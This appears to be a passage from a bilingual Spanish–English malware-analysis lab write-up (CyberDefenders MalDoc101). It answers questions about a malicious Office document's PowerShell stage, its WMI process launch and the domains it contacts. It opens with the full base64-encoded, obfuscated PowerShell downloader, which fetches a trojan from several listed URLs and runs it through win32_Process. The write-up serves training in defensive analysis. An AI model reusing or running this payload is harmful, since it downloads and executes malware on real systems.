AdgBlAG4AdABzAC8AaQBuAGYAbwByAG0AYQB0AGkAbwBuAGwALwA4AGwAcwBqAGgAcgBsADYAbgBuAGsAdwBnAHkAegBzAHUAZAB6AGEAbQBfAGgAMwB3AG4AZwBfAGEANgB2ADUALwAqAGgAdAB0AHAAOgAvAC8AZABpAGcAaQB3AGUAYgBtAGEAcgBrAGUAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8ANwAyAHQAMABqAGoAaABtAHYANwB0AGEAawB3AHYAaQBzAGYAbgB6AF8AZQBlAGoAdgBmAF8AaAA2AHYAMgBpAHgALwAqAGgAdAB0AHAAOgAvAC8AaABvAGwAZgB2AGUALgBzAGUALwBpAG0AYQBnAGUAcwAvADEAYwBrAHcANQBtAGoANAA5AHcAXwAyAGsAMQAxAHAAeABfAGQALwAqAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBjAGYAbQAuAG4AbAAvAF8AYgBhAGMAawB1AHAALwB5AGYAaAByAG0AaAA2AHUAMABoAGUAaQBkAG4AdwByAHUAdwBoAGEAMgB0ADQAbQBqAHoANgBwAF8AeQB4AGgAeQB1ADMAOQAwAGkANgBfAHEAOQAzAGgAawBoADMAZABkAG0ALwAnAC4AIgBzAGAAUABsAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAZQBjAGMAaQBlAHIAZABlAGUAdABoAD0AJwBkAHUAdQB6AHkAZQBhAHcAcAB1AGEAcQB1ACcAOwBmAG8AcgBlAGEAYwBoACgAJABnAGUAZQByAHMAaQBlAGIAIABpAG4AIAAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQApAHsAdAByAHkAewAkAHIAZQB1AHMAdABoAG8AYQBzAC4AIgBkAE8AVwBOAGAAbABvAEEAYABkAGYAaQBgAEwAZQAiACgAJABnAGUAZQByAHMAaQBlAGIALAAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAYgB1AGgAeABlAHUAaAA9ACcAZABvAGUAeQBkAGUAaQBkAHEAdQBhAGkAagBsAGUAdQBjACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQAnACsAJwBJAHQAZQAnACsAJwBtACcAKQAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQAuACIAbABgAGUATgBHAFQASAAiACAALQBnAGUAIAAyADQANwA1ADEAKQAgAHsAKABbAHcAbQBpAGMAbABhAHMAcwBdACcAdwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAnACkALgAiAEMAYABSAGUAYQBUAGUAIgAoACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAcQB1AG8AbwBkAHQAZQBlAGgAPQAnAGoAaQBhAGYAcgB1AHUAegBsAGEAbwBsAHQAaABvAGkAYwAnADsAYgByAGUAYQBrADsAJABjAGgAaQBnAGMAaABpAGUAbgB0AGUAaQBxAHUAPQAnAHkAbwBvAHcAdgBlAGkAaABuAGkAZQBqACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHQAbwBpAHoAbAB1AHUAbABmAGkAZQByAD0AJwBmAG8AcQB1AGwAZQB2AGMAYQBvAGoAJwA=�Tab3�Tab45��Tahoma
```

#### Respuesta

`powershell`

## Q8

What WMI class is used to create the process to launch the trojan?

¿Qué clase WMI se utiliza para crear el proceso para lanzar el troyano?

![script output cyberchef wmi class](/images/labs/cyberdefenders/maldoc101/maldoc101_q8.png)


#### Respuesta

`win32_Process`

## Q9

Multiple domains were contacted to download a trojan. Provide first FQDN as per the provided hint.

Se contactó con varios dominios para descargar un troyano. Proporcione el primer FQDN según la pista proporcionada.

![script output cyberchef domain](/images/labs/cyberdefenders/maldoc101/maldoc101_q9.png)

#### Respuesta

`haoqunkong.com`
